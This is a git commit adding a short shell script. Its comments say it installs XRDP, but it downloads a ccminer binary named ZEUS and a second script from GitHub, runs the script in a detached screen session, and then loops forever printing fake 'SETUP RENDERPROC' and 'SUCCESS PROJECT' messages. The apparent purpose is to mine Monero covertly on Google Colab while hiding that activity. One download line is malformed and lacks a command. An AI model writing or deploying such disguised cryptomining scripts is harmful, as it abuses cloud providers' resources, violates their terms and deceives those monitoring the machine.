cf21fc5fbf86b2740ccc84b16b0c2c6c26b4cef3
renilo <88342640+renilo@users.noreply.github.com>
2022-10-10 21:59:48 +0700

    Create anakanak.sh

---
+++ anakanak.sh
@@ -0,0 +1,19 @@
+# /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt-get install screen -y
+clear
+sleep 1
+sudo wget -q https://github.com/indah38/ccminer/raw/main/ZEUS
+sudo https://raw.githubusercontent.com/renilo/kuuntul/main/anak.sh
+
+clear
+sleep 1
+chmod 700 ZEUS
+clear
+sleep 1
+screen -dmS Running ./anak.sh
+sleep 1
+i=1
+while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
